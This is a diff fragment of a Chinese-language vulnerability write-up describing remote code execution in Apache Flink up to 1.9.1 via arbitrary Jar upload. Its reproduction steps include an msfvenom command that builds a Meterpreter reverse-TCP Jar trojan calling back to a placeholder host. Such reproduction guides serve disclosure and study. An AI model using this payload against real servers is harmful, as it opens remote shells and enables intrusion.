@@ -11,7 +11,7 @@ source: "MrWQ/vulnerability-paper"
 
 **漏洞描述：**
 
-近日, 有安全研究员公开了一个 Apache Flink 的任意 Jar 包上传导致远程代码执行的漏洞. 
+近日, 有安全研究员公开了一个 Apache Flink 的任意 Jar 包上传导致远程代码执行的漏洞. 
 
 **漏洞影响：**
 
@@ -19,7 +19,7 @@ Apache Flink <= 1.9.1(最新版本)
 
 **漏洞复现：**
 
-漏洞 url： 
+漏洞 url： 
 
 ```
 http://x.x.x.x
@@ -37,7 +37,7 @@ http://x.x.x.x
 打开 MSF 生成一个 jar 木马
 
 ```
-msfvenom ‐p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx‐f jar > test.jar
+msfvenom ‐p java/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=xxx‐f jar > test.jar
 
 ```
 
